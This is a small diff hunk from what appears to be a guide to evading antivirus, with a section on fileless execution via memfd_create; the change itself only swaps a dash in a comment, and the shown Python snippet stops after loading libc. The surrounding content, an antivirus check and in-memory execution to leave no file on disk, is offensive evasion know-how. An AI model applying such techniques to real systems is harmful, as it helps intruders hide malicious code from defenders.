@@ -34,7 +34,7 @@ ps aux | grep clam
 ## 2. Fileless Execution
 
 ```bash
-# memfd_create — execute from memory (no file on disk)
+# memfd_create - execute from memory (no file on disk)
 python3 -c "
 import ctypes, os, base64
 libc = ctypes.CDLL('libc.so.6')
